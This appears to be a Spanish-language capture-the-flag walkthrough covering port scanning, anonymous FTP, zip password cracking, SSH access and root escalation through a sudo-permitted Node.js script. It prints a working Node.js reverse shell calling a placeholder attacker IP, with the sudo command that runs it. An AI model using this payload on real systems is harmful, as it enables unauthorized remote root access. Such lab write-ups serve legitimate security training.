1-Ping y NMAP

<img width="771" height="685" alt="image" src="https://github.com/user-attachments/assets/271b59dd-1e13-455f-90fa-21dddd235eab" />

2- Vemos que el ftp en anonymous esta on, vamos a mirar que hay.

<img width="672" height="514" alt="image" src="https://github.com/user-attachments/assets/362391df-dde8-402c-ba43-0edc552337a1" />

Vemos que hay un fichero, lo cojemos y vamos a intentar abrirlo.

3- Romper contraseña zip.

<img width="830" height="497" alt="image" src="https://github.com/user-attachments/assets/9f7ac458-28de-4498-a527-5849534e658d" />

Vale, ya tenemos la contraseña, vamos a descomprimir ahora.

<img width="432" height="219" alt="image" src="https://github.com/user-attachments/assets/8bdfbdfc-51ca-451f-89c5-aeba69ffdc86" />

4- Entramos via ssh

<img width="928" height="402" alt="image" src="https://github.com/user-attachments/assets/1d252d9d-d4ba-48ec-8bb6-1e9a76895f0f" />
Haciendo sudo -l, vemos que hay un script, que lo podemos usar como via de escalada.

<img width="519" height="104" alt="image" src="https://github.com/user-attachments/assets/8cd4f9df-28be-42cd-9325-831cea4cdd32" />
 Le pasaremos una reverse shell dentro del script:

 (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(1234, "TU IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

<img width="507" height="119" alt="image" src="https://github.com/user-attachments/assets/6647d8ac-8e8e-4ae5-9c08-50dce0a1ac8c" />

Nos ponemos a la escucha con netcat y luego ejecutamos el script::sudo /usr/bin/node /home/mario/script.js

